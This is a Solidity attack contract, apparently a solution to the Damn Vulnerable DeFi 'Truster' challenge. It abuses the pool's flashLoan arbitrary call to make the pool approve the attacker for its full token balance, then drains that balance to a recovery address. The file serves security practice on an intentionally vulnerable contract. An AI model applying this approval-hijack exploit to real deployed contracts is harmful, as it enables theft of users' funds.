pragma solidity =0.8.25;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract Attacker {
    TrusterLenderPool lender;
    address recoveryAddress;
    DamnValuableToken dvt;

    constructor(address _lenderAddress, address _recoveryAddress, address _dvtAddress) {
        lender = TrusterLenderPool(_lenderAddress);
        recoveryAddress = _recoveryAddress;
        dvt = DamnValuableToken(_dvtAddress);
    }

    function attack() external returns (bool) {

        uint256 poolBalance = dvt.balanceOf(address(lender));

        require (
            lender.flashLoan(
                0,
                address(this),
                address(dvt),
                abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance)
            )
        );

        require(dvt.transferFrom(address(lender), recoveryAddress, poolBalance));

        return true;
    }
}